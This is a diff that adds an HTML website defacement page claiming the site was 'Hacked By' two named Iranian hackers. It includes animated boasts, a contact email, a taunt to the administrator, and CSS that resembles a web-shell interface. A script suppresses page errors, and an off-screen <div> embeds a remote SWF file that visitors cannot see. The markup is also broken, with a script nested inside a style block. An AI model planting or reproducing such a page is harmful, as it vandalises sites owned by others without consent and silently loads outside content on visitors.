@@ -1,0 +1,89 @@
+<html allow-background-captures="true"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>Hacked By QmarsEmad And HaJ Matin Katalon :D</title> <style type="text/css">body {     background: #000000;     font-family: Courier New;     color: #ff0000;     text-align: center;     }     a {     text-decoration:none;     color:     #ff0000;     }     </style>  <script type="text/javascript">/*<![CDATA[*/  TypingText = function(element, interval, cursor, finishedCallback) {     if((typeof document.getElementById ==     "undefined") || (typeof element.innerHTML == "undefined")) {     this.running = true;     return;     }     this.element = element;     this.finishedCallback = (finishedCallback     ? finishedCallback : function() { return; });     this.interval = (typeof interval == "undefined" ? 100 : interval);     this.origText = this.element.innerHTML;     this.unparsedOrigText = this.origText;     this.cursor = (cursor ? cursor : "");     this.currentText = "";     this.currentChar = 0;     this.element.typingText = this;     if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;     TypingText.all.push(this);     this.running = false;     this.inTag = false;     this.tagBuffer = "";     this.inHTMLEntity = false;     this.HTMLEntityBuffer = "";     }     TypingText.all = new Array();     TypingText.currentIndex = 0;     TypingText.runAll     = function() {     for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();     }     TypingText.prototype.run = function() {     if(this.running) return;     if(typeof this.origText == "undefined") {     setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);     return;     }     if(this.currentText == "") this.element.innerHTML = "";     if(this.currentChar < this.origText.length) {     if(this.origText.charAt(this.currentChar) == "<" &&     !this.inTag) {     this.tagBuffer = "<";     this.inTag = true;     this.currentChar++;     this.run();     return;     } else if(this.origText.charAt(this.currentChar) == ">" &&     this.inTag) {     this.tagBuffer += ">";     this.inTag = false;     this.currentText += this.tagBuffer;     this.currentChar++;     this.run();     return;     } else     if(this.inTag) {     this.tagBuffer += this.origText.charAt(this.currentChar);     this.currentChar++;     this.run();     return;     } else     if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {     this.HTMLEntityBuffer = "&";     this.inHTMLEntity = true;     this.currentChar++;     this.run();     return;     } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {     this.HTMLEntityBuffer += ";";     this.inHTMLEntity =     false;     this.currentText += this.HTMLEntityBuffer;     this.currentChar++;     this.run();     return;     } else if(this.inHTMLEntity) {     this.HTMLEntityBuffer +=     this.origText.charAt(this.currentChar);     this.currentChar++;     this.run();     return;     } else {     this.currentText += this.origText.charAt(this.currentChar);     }     this.element.innerHTML = this.currentText;     this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ?     this.cursor(this.currentText) : this.cursor) : "");     this.currentChar++;     setTimeout("document.getElementById('" + this.element.id + "').typingText.run()",     this.interval);     } else {     this.currentText = "";     this.currentChar = 0;     this.running = false;     this.finishedCallback();     }     }        /*]]>*/</script><style type="text/css"> *{font-family:Ubuntu Mono,serif;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:0;} body{background:#000000;font-size:12px;color:#FFFFFF;font-weight:400;} hr{border-bottom:1px dashed #222222;} a{color:#4C9CAF;text-decoration:none;} a:hover{color:#FFFFFF;} pre{padding:0 8px;} form{display:inline;} table th,p{cursor:default;} input:focus,select:focus,textarea:focus,button:focus{outline: none;} #main{background:#111111;-moz-border-radius:10px;border-radius:10px;width:100%;padding:2px 8px;} #header{text-align:left;margin:0;padding:0;} #header td{margin:0;padding:0;} #header h1{font-size:20px;-webkit-transform:rotate(-13.37deg);-moz-transform:rotate(-13.37deg);-ms-transform:rotate(-13.37deg);-o-transform:rotate(-13.37deg);transform:rotate(-13.37deg);margin:0;padding:0;} #header h1 a,.explorelist:hover a{color:#FFFFFF;} #menu{background:#111111;margin:0 2px 4px;} #result{-moz-border-radius:10px;border-radius:10px;border:1px solid #4C9CAF;line-height:16px;background:#111111;color:#AAAAAA;margin:0 0 8px;padding:4px 8px;} .headinfo{border-left:1px solid #4C9CAF;margin:6px;padding:2px 0 0 16px;} .headtbls tr{height:24px;vertical-align:middle;} .gaya,.ver{color:#4C9CAF;font-weight:700;} .ver{-webkit-transform:rotate(-13.37deg);-moz-transform:rotate(-13.37deg);-ms-transform:rotate(-13.37deg);-o-transform:rotate(-13.37deg);transform:rotate(-13.37deg);letter-spacing:2px;} .menumi{background:#292929;color:#4C9CAF;text-decoration:none;letter-spacing:2px;font-size:12px;-webkit-transform:rotate(-13.37deg);-moz-transform:rotate(-13.37deg);-ms-transform:rotate(-13.37deg);-o-transform:rotate(-13.37deg);transform:rotate(-13.37deg);-moz-border-radius:4px;border-radius:4px;margin:0;padding:4px 8px;} .menumi:hover{background:#363636;-webkit-transform:rotate(13.37deg);-moz-transform:rotate(13.37deg);-ms-transform:rotate(13.37deg);-o-transform:rotate(13.37deg);transform:rotate(13.37deg);} .inputz,.prompt,.txtarea{background:#111111;border:0;border-bottom:1px solid #363636;font-size:12px;color:#FFFFFF;padding:2px;} .prompt{font-weight:700;} .txtarea{width:100%;height:370px;} .inputzbut{font-size:12px;background:#191919;color:#4C9CAF;border:1px solid #222222;margin:0 4px;} .but{float:left;background:#4C9CAF;color:#000000;margin:0 4px 0 0;font-size:20px;width:16px;height:16px;border-radius:50%;text-align:center;padding:0;line-height:12px;cursor:default} .explore{width:100%;padding:4px 0;} .explore a{text-decoration:none;} .explore td{border-bottom:1px solid #222222;line-height:24px;padding:0 8px;vertical-align:top;} .explore th{font-weight:700;background:#222222;padding:6px 8px;} .explore tr:hover{background:#191919;} .sembunyi{display:none;margin:0;padding:0;} .info table{width:100%;border-radius:6px;border:1px solid #4C9CAF;margin:4px 0;padding:8px;} .info th,th{background:#191919;font-weight:700;} .info td{border-bottom:1px solid #222222;} .info h2{text-align:center;font-size:15px;background:#191919;letter-spacing:6px;border-radius:6px;border-bottom:1px solid #4C9CAF;margin:4px 0 8px;padding:10px;} .info a{color:#CCCCCC;} .viewfile{width:100%;border-bottom:1px solid #222222;margin:0 0 4px;} .viewfile td{border-bottom:1px solid #222222;background:#191919;height:24px;padding:2px 4px;} .viewfilecontent{padding:11px 8px;} .mybox{-moz-border-radius:10px;border-radius:10px;border:1px solid #4C9CAF;margin:4px 0 8px;padding:14px 8px;} .mybox h2{border-bottom:1px solid #444444;color:#4C9CAF;margin:0;padding:0 0 8px;} .notif{background:#4C9CAF;color:#000000;border-radius:6px;font-weight:700;margin:3px 0;padding:4px 8px 2px;} .notif a{color:#000000;} .footer{text-align:right;font-size:10px;letter-spacing:2px;color:#222222;padding:0 16px;} .headtbl,.myboxtbl{width:100%;} input[type=checkbox].css-checkbox + label.css-label{padding-left:20px;height:15px;display:inline-block;line-height:15px;background-repeat:no-repeat;background-position:0 0;vertical-align:middle;cursor:pointer;} input[type=checkbox].css-checkbox:checked + label.css-label{background-position:0 -15px;} .info,.info h1,.info hr,input[type=checkbox].css-checkbox{display:none;} .css-label{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAeCAYAAADzXER0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAASdJREFUeNrsk0GKwjAYhZNJqYviQpDKLOcY3sOFIF5DFF0KgjeYAwizmDuNOxHcFrGlje9pA1KbNOqshvnh2YD58v6m75dxHIdCiAk0gt5Fc+2gDbQO8DNTSk1D1BtKSikoWxVF0U7TdJ5lmSI8BtfCARKsoFyw1poeLcBjwl0aEgqCwAma4n5yhC+AceSzqdD69RAD+zjedSBeqH/4CfiA74bgaG+o3HxQURR1sOgjnqpMDv+0ikZJkpzyPP9kwlbIaQgNsO55GO+hb2hp3vnI1Hl2XZT7xe+PJNbWYWgcyao7L+p22h4ayephdyPJVl3v+jFcuhNmg+tAazxvN9tA86m83H6+Fm5n3mpd49sSlDaYN3jJb8WFazMy2rftujb/yEieBRgAZHG/OeGef6MAAAAASUVORK5CYII=);} .icon{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAKYSURBVDjLnZPJT1NRFMb5G1wDHV5boNiqdHrvFYolCAtsGSSWKpMFKhYqlDI6oAEKaVJwCIgSphaKtLYWCgSNBgRjMNHoxsSFS3cmJmA0NMTw+R6JKKZl4eJL7sm953fOd3JPHIC4WMpcppG5SGnZc8ZjVVF6QLn975sDgfaZmvg71oRJZIRUYcuAnq/2KWroGfm3QwEn2YpLVPPvOD2oiqj9yq/mGznegl56mx6T7ZbY1M6YAM0CuZkxT0b2Wg6QW/SsApRXDsotR+d6E9Y/h9DuqoCuJq0lKoDxqU1/pITGR27mBU4h+GEcTz5OY+ClA5JbyahYzof/9TBO9B/FcWcqpA4xU3We3GJ87ntnfO5meinMvruNnqcmXA2XoDVcCc0wCYkzBaZpA7ILRJ/2O2B87jA+QT9UeDRe8svZYAG8b/txc6kc9mA+yqayYPQXwvdmBEOrA5B2p0BtFIYOWKCm5RukWwZyXIbA+0F0LpaiKaBHmVsLw4we99ccsM8a8GClF5JOMcQdou8prULrgRmQo7KI0VcE13MrGv06lE5kodhzGvdWu2GdKkTVWC4DcELcJkKyXbCb1EhAVM//M0DVUNqP2qAJd1baUDaZjTMTeXAttsPi0cM0mgvHvA0NkxYk2QRIrieOsDmEmXttH0DfVfSluSToWmpD8bgOroUOWNw6VI7koGfOBuq6EqLLTNU6ojrmP5D1HVsjmrkYezGIrlA9LjKgnrlGXJlpgbCOD0EtD0QNN8I3cZqjAlhJr4rXpB1iNLhrYffUQWoT7yUKzbxqJlHLq0jc5JYmgHMunogKYJVqF7mTrPyfgktMRTMX/CrOq1gLF3fYNrLiX+Bs8MoTwT2fQPwXgBXHGL+TaIjfinb3C7cscRMIcYL6AAAAAElFTkSuQmCC);margin:6px 0;border:0;padding:1px 8px 0 8px;} .drive-letter{color:#FFFFFF;} .desc{color:#999999;} .cbox_selected{background-color:#202020;} .cbox_all{text-align:center;text-indent:4px;} .schemabox{background-color:#4C9CAF;border-radius:2px;} .border-bottom{border-bottom:1px solid #363636;} .border-top{border-top:1px solid #363636;} #navigation{position:fixed;left:-16px;top:46%;} #totop,#tobottom{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsSAAALEgHS3X78AAAEYElEQVRYw8VXS0xcVRj+z7kv5tF5MPfOo1AgkFBKoQPuFAyxstKkcWHjGhOjcacxujMxaqtx48b4iDExxiZuXBVdtEURN00qDBMgTUOmnTEMc+/ce4d5c+k957gZEKYCd5DSb3tOzv+d//0hcACO47hgsL07HA5fDIfDkz6ffxQAogDgblypMcZypVIpYRj6DVVVZ0zTSBNCyGFvo4MOMca8LMsjvb19r8uy8iLGOAIA+JA3KaVU1XV9OpVa/VrX9QSl1G6ZgM/ni5w7N/iuooSnMMZBOAIopQVN0767e3fls1KppDoigBCCrq6ukf7+gS9cLtfTh3nJAVi9Xr+dTCbf1LTcAmNsb3ibjXd394wPDQ1fE0UxfgzGAQCQIAid0Whs8uHDrflisZjZl8Dp052jw8PxazzP9cExA2PcHgopE7Va7Y9yuZR7hIDP54uMjj71gySJF+AxAWPcHgwGh3U9f92yrOoOAYwxF4+PvB8IBF9u0e02AFAHlbEDQRA63W43zWbXf2eMMQwA0NHROaoo4VdbeYgxZmUy6SuZTPojxthmK46QZeU1WQ5d2O4x3MDA4Ader3esFePp9IMrS0tLn2iaNieKIvH7A88ghHhHWYmQWxQltL6e/ZULheTe/v7+qwjhU60YX15e/pQQ22KMEsMwbrdKwuVyxQoF82eup6fvcigUesVJ7Bljm+n0g6vbxnc1HKLrrZFACHksy1rhBgfPv9fW1jbk8OePGP/3fIeE7fcHxhyQQBijOhePj3wIAHIrbt//Xmue4HmB586eHfgYAKSj/vz/eAJjLPAA4DlonhSLpe9VVfsxGAyGd8d8Y6OgUkrJdh8JBIIRjPFOY1NV7adAINgRCATeOKC8vejSpZfs5pa8+0MAUGSM7RmnlmXlZ2d/m7AsKw8AIEmSMjHx3KwkSUpTovEA4D8gwQkPAJXGpf2mZQAh1JzBpOlXGCHUjhCSW+zOFWzbdg6eEGzbXseVSnnxSRGoVMqLWNfNm42BctIghmHcxJqWu0UpOfEwUErVfF6bwYWCmdZ1Y/qkCei6Pm0YRhoTQkgqtfoVpdR0vGMhwKIoKZIkRSRJioiipCDkfJRTSo1UavVLQgjhG2wW83nt20gk+o6TnUAQxNDY2PgMY4w2yhILghByat80jW8Mw0jubESMMVaplJORSHRcEIQzDiYZ4jjOw/O8l+d5L8dxHtTcLPbB5mb9z0Ri4a16vV7ZsxNallWtVqt/xWKxixjj0GNJe0LuLSzMTxmGfv8/t+JarapubW3Ny7Ly7HGTsG373srK8lQ2u3Zn37UcAKBYLP5tWZtzPp9vUBDEM8egDWi1Wp1bXExMZbNrdw4UJrtIqLmcel0UJdvj8Z7HGLmPVuvEWFtb+zyRWHh7Y6Nw/yjilJNlpSFO5RcwxjGH4nRd1/VfdolTciR13CTPu8Lh8POyLE96vafiPM9HAWB7kS3btp2rVMpJ0zRvqKp6yzSNjBN5/g/C3ULDeIdIrQAAAABJRU5ErkJggg==);width:32px;height:32px;opacity:0.30;margin:12px 0;} #totop:hover,#tobottom:hover{opacity:0.80;} #tobottom{-webkit-transform:scaleY(-1);-moz-transform:scaleY(-1);-o-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-filter:"FlipV";} .peler{  font color:white; border-style:solid;  text-decoration:bold; } </style> <style>
+body {
+background: #000;
+font-family: "Trebuchet MS", Verdana, sans-serif;
+}
+h1 {
+color: #333;
+font-size: 40px;
+margin: 1px auto;
+text-align:center;
+text-transform:uppercase;
+}
+.neon {
+color: #FFFFFF;
+text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;
+}
+
+<script>
+<script language="JavaScript1.2">
+function ClearError() {return true;}
+window.onerror = ClearError;
+</script>
+
+</style></head><body>&nbsp;<script>
+window.onload = function() {
+var h1 = document.getElementsByTagName("h1")[0],
+text = h1.innerText || h1.textContent,
+split = [], i, lit = 0, timer = null;
+for(i = 0; i < text.length; ++i) {
+split.push("<span>" + text[i] + "</span>");
+}
+h1.innerHTML = split.join("");
+split = h1.childNodes;
+
+var flicker = function() {
+lit += 0.01;
+if(lit >= 1) {
+clearInterval(timer);
+}
+for(i = 0; i < split.length; ++i) {
+if(Math.random() < lit) {
+split[i].className = "neon";
+} else {
+split[i].className = "";
+}
+}
+}
+setInterval(flicker, 100);
+}
+</style>
+</script><p></p>
+<p style="text-align:center" align="center"><span style="mso-no-proof:yes"><img alt="http://s6.uploads.im/d/j5W0c.gif" src="http://s6.uploads.im/d/j5W0c.gif
+" id="_x0000_i1025" height="352" width="450"></span><br>
+<br>
+<b><span 100000000"="" style="font-family:&quot;Courier New&quot;;color:gray;mso-themecolor:background1;
+&lt;font size="> 
+<br>
+<span style="mso-spacerun:yes"> <br>
+<br><h3> <marquee scrollamount="200" scrolldelay="50" width="15%"><h3>EmadQmars AND HaJ Matin Katalon WaS Here</h3> </marquee><br>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br>
+<br>
+<font size="1000">Hacked BY EmadQmars And HaJ Matin KataloN</font>
+<br>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br>
+<br>
+<span style="mso-spacerun:yes">        </span></span></span></b><b><span style="font-family:&quot;Courier New&quot;;color:red">Contact:</span></b><b><span style="font-family:&quot;Courier New&quot;;color:gray;mso-themecolor:background1;
+mso-themeshade:300"><span style="mso-spacerun:yes">  
+</span>New Yahoo ID :D :mr.r00t3r@Yahoo.com <br>
+<font size="500">The Iranian Hackers Are Big In World </font>
+<br>
+<p>???? ????? ?? ?????? ??????</p>
+<p>????? ???? ?? ???? ???? ???? ??????? ?? ???? =))</p>
+<p>???? ??? ???? ?? ???? ?? ?????</p>
+<br>
+<h2>WE ARE PERSIAN HACKER </h2>
+<br>
+MyBestFriend:<span style="font-family:&quot;Courier New&quot;;color:red">Hesam Shar</span> - <span style="font-family:&quot;Courier New&quot;;color:yellow">Ehsan_Fun</span> <span style="font-family:&quot;Courier New&quot;;color:blue">HaJ Matin KataloN</span> 
+<br>
+Hey Admin Tell Me For Your Security :D
+<br>
+
+<cite><div style="position:absolute;top:-300%"><embed src="http://8pic.ir/images/3jcznmi6k7m5f8l5jpmn.swf"></div>
+
+</cite>
+</span></b></p>
+</body></html>
+
